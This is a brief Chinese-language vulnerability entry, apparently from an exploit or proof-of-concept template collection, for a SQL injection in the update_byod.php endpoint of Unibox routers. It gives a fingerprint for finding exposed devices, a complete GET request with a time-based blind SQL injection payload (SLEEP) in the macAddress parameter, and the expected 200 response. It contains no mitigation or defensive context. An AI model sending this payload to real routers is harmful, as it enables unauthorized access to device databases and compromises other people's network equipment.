# Unibox路由器update_byod.php存在SQL注入漏洞

Unibox ｜ SQL注入 ｜ —
- **指纹**：`body="Unibox"`
- **请求**：`GET /authentication/update_byod.php?update=1&macAddress=1&macAddress=1'+AND+(SELECT+2936+FROM+(SELECT(SLEEP(3)))EuPD)+--+pcs HTTP/1.1`
- **响应特征**：200